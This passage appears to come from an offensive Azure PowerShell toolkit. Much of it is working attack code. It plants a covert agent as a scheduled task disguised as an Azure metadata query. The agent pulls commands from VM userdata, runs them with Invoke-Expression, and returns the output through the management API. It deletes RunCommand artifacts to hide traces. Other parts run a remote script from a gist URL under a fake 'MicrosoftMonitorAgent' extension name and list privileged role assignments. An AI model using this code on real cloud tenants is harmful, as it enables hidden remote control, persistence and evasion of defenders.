gAgACAAIAAgADwAVwBhAGsAZQBUAG8AUgB1AG4APgBmAGEAbABzAGUAPAAvAFcAYQBrAGUAVABvAFIAdQBuAD4ACgAgACAAIAAgADwARQB4AGUAYwB1AHQAaQBvAG4AVABpAG0AZQBMAGkAbQBpAHQAPgBQAFQANwAyAEgAPAAvAEUAeABlAGMAdQB0AGkAbwBuAFQAaQBtAGUATABpAG0AaQB0AD4ACgAgACAAIAAgADwAUAByAGkAbwByAGkAdAB5AD4ANwA8AC8AUAByAGkAbwByAGkAdAB5AD4ACgAgACAAPAAvAFMAZQB0AHQAaQBuAGcAcwA+AAoAIAAgADwAQQBjAHQAaQBvAG4AcwAgAEMAbwBuAHQAZQB4AHQAPQAiAEEAdQB0AGgAbwByACIAPgAKACAAIAAgACAAPABFAHgAZQBjAD4ACgAgACAAIAAgACAAIAA8AEMAbwBtAG0AYQBuAGQAPgBwAG8AdwBlAHIAcwBoAGUAbABsADwALwBDAG8AbQBtAGEAbgBkAD4ACgAgACAAIAAgACAAIAA8AEEAcgBnAHUAbQBlAG4AdABzAD4AIgBDADoAXABXAGkAbgBkAG8AdwBzAEEAegB1AHIAZQBcAFMAZQBjAEEAZwBlAG4AdABcAEEAegB1AHIAZQBJAG4AcwB0AGEAbgBjAGUATQBlAHQAYQBkAGEAdABhAFMAZQByAHYAaQBjAGUALgBwAHMAMQAiADwALwBBAHIAZwB1AG0AZQBuAHQAcwA+AAoAIAAgACAAIAA8AC8ARQB4AGUAYwA+AAoAIAAgADwALwBBAGMAdABpAG8AbgBzAD4ACgA8AC8AVABhAHMAawA+AA=='
$Check = Get-ScheduledTask -TaskName 'Azure Instance Metadata Service Query'
If(!$Check){$xml = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($task))
Register-ScheduledTask -TaskName 'Azure Instance Metadata Service Query' -Xml $xml
Start-ScheduledTask -TaskName 'Azure Instance Metadata Service Query'}
$AIMSData = Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET  -Uri "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
$UserData = $AIMSData.compute.userdata
$B64D = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($userdata))
$split = $B64D.Split('%')
$Headers = @{}
$Headers.Add("Authorization","Bearer"+ " " + "$($split[1])") 
$data = Invoke-Expression $split[0] | out-string
If($split[1]){
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($data)
$EncodedText =[Convert]::ToBase64String($Bytes)
$json = '{"properties": { "userData": ' + '"' + $EncodedText + '",	}}'
$Uri = 'https://management.azure.com/' + $split[2] + '?api-version=2021-07-01'
$RestMethod = Invoke-RestMethod -Method PATCH -Uri $uri -Body $Json -Header $Headers -ContentType 'application/json'}
rm C:\Packages\Plugins\Microsoft.CPlat.Core.RunCommandWindows\1.1.9\Downloads\*
'@
	$new = New-Item -Name "WindowsDiagnosticTest.ps1" -ItemType "file" -Value $data
	$path = $new.DirectoryName + '\' + $new.Name 
	Write-Host "Uploading Agent..." -ForegroundColor Yellow
	$change = Invoke-AzVMRunCommand -VMName $vm -ResourceGroup $rg -CommandId 'RunPowerShellScript' -ScriptPath $path
	If($change){
		Write-Host "Agent successfully deployed!" -Foregroundcolor Green
	}
	rm $path
}
function Invoke-AzureCustomScriptExtension {
<# 
.SYNOPSIS
    Runs a PowerShell script by uploading it as a Custom Script Extension
.PARAMETER 
    -Uri (URI/URL where the script is located)
    -VM (VM to run the script on)
.EXAMPLE
	Invoke-AzureCustomScriptExtension -VM 'Windows10' -Uri https://gist.githubusercontent.com/hausec/fa38e7005be29f959df90044ef4bcc29/raw/18aadb137a660e0c7393a999136685b8d8ab5b87/test.ps1
#>
    [CmdletBinding()]
    Param(
	[Parameter(Mandatory=$true,HelpMessage='VM name')][String]$VM = $null,
	[Parameter(Mandatory=$false,HelpMessage='Uri where the script is located')][String]$Uri = $false)
    
    If ($Uri){
    $VMData = Get-AzVM -Name $VM
    Set-AzVMCustomScriptExtension -ResourceGroupName $VMData.ResourceGroupName -VMName $VMData.Name -Location $VMData.Location -FileUri $Uri -Name MicrosoftMonitorAgent
    }
}
function Get-AzurePIMAssignment{
<# 
.SYNOPSIS
   Gathers the Privileged Identity Management assignments. Currently, only AzureRM roles are returned.
#>
    $headers = Get-AzureRESTToken
    $Context = Get-AzContext
    $subid = $Context.Subscription.id   
    $uri = 'https://management.azure.com/providers/Microsoft.Subscription/subscriptions/'+$subid+ '/providers/Microsoft.Authorization/roleEligibilityScheduleRequests?api-version=2020-10-01-preview'
    $ARMPIMData = Invoke-RestMethod -Method GET -Uri $uri -Header $Headers
    $ARMPIMS = $ARMPIMData.Value.Properties  
    ForEach ($ARMPIM in $ARMPIMS){
        If($ARMPIM.principalType -eq 'User'){
            $Username = Get-AzADUser -ObjectId $ARMPIM.principalId
            $name = $Username.userprincipalname
        }
        If($ARMPIM.principalType -eq 'Group'){ 
            $Groupname = Get-AzADGroup -ObjectId $ARMPIM.principalId
            $name = $Groupname.displayname
        }       
        $role = $ARMPIM.roleDefinitionId
        $split = $role.split('/')
        $defid = $split[-1]
        $rolename = Get-AzRoleDefinition -Id $defid
    	$Obj = [PSCustomObject]@{
		PrincipalName = $name
		PrincipalType = $ARMPIM.principalType
		Role = $rolename.name
		Scope = $ARMPIM.scope
		Status = $ARMPIM.status
        }
        $Obj | fl
    }
}
